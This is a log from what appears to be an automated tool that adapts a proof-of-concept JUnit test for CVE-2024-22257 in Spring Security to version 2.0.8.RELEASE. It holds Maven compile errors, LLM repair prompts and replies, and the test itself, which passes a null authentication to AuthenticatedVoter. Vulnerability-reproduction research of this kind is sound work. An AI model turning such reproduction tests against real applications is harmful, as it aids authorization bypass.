[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,14] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class ConfigAttribute[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[92m[RepairModule] Error package org.springframework.security.access does not exist resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,14] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class ConfigAttribute[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 3271 (prompt), 1 (completion), 3272 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
  symbol:   class Authentication
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,14] cannot find symbol
  symbol:   class ConfigAttribute
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
  symbol:   variable AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol
  symbol:   variable SecurityConfig
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
  symbol:   class AnonymousAuthenticationToken
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
  symbol:   variable AuthorityUtils
  location: class edu.vision.se.Testcase1
[INFO] 14 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.235 s
[INFO] Finished at: 2025-07-10T06:45:22Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
[ERROR]   symbol:   class Authentication
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,14] cannot find symbol
[ERROR]   symbol:   class ConfigAttribute
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
[ERROR]   symbol:   variable AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol
[ERROR]   symbol:   variable SecurityConfig
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
[ERROR]   symbol:   class AnonymousAuthenticationToken
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
[ERROR]   symbol:   variable AuthorityUtils
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 137 (prompt), 7 (completion), 144 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: package org.springframework.security.access does not exist, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code: import org.springframework.security.access.ConfigAttribute; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.springframework.security.access;ConfigAttribute
[96m[ErrorManager] Extracted key entities: ['org.springframework.security.access', 'ConfigAttribute'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 8, 'column': 43, 'message': 'package org.springframework.security.access does not exist', 'symbol': None, 'location': None, 'code_line': 'import org.springframework.security.access.ConfigAttribute;'} with cause: ['org.springframework.security.access', 'ConfigAttribute'][0m
[96m[Adapter] Related diffs for error: [(432, 10.0), (444, 8.0), (449, 8.0), (456, 8.0), (473, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: package org.springframework.security.access does not exist | cause: ['org.springframework.security.access', 'ConfigAttribute'][0m
[96m[RepairModule] Trying best diff #432 with score 10.00[0m
[LLMClient] Tokens used: 1104 (prompt), 259 (completion), 1363 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: package org.springframework.security.access does not exist, symble: None, location: None

### Error Position:
import org.springframework.security.access.ConfigAttribute;

### Related Diff:
Operation: NEW_FILE, File: core/src/main/java/org/springframework/security/ConfigAttribute.java, Hunk: @@ -1,56 +0,0 @@
+/* Copyright 2004, 2005, 2006 Acegi Technology Pty Limited
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.springframework.security;
+
+import java.io.Serializable;
+
+
+/**
+ * Stores a security system related configuration attribute.
+ *
+ * <p>
+ * When an {@link org.springframework.security.intercept.AbstractSecurityInterceptor}
+ * is setup, a list of configuration attributes is defined for secure object
+ * patterns. These configuration attributes have special meaning to a {@link
+ * RunAsManager}, {@link AccessDecisionManager} or
+ * <code>AccessDecisionManager</code> delegate.
+ * </p>
+ *
+ * <P>
+ * Stored at runtime with other <code>ConfigAttribute</code>s for the same
+ * secure object target within a {@link ConfigAttributeDefinition}.
+ * </p>
+ *
+ * @author Ben Alex
+ * @version $Id$
+ */
+public interface ConfigAttribute extends Serializable {
+    //~ Methods ========================================================================================================
+
+    /**
+     * If the <code>ConfigAttribute</code> can be represented as a <code>String</code> and that
+     * <code>String</code> is sufficient in precision to be relied upon as a configuration parameter by a {@link
+     * RunAsManager}, {@link AccessDecisionManager} or <code>AccessDecisionManager</code> delegate, this method should
+     * return such a <code>String</code>.<p>If the <code>ConfigAttribute</code> cannot be expressed with
+     * sufficient precision as a <code>String</code>,  <code>null</code> should be returned. Returning
+     * <code>null</code> will require any relying classes to specifically support the  <code>ConfigAttribute</code>
+     * implementation, so returning  <code>null</code> should be avoided unless actually  required.</p>
+     *
+     * @return a representation of the configuration attribute (or <code>null</code> if the configuration attribute
+     *         cannot be expressed as a <code>String</code> with sufficient precision).
+     */
+    String getAttribute();
+}

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.access.ConfigAttribute;
import org.springframework.security.access.SecurityConfig;
import org.springframework.security.access.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.access.SecurityConfig;
import org.springframework.security.access.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol[0m
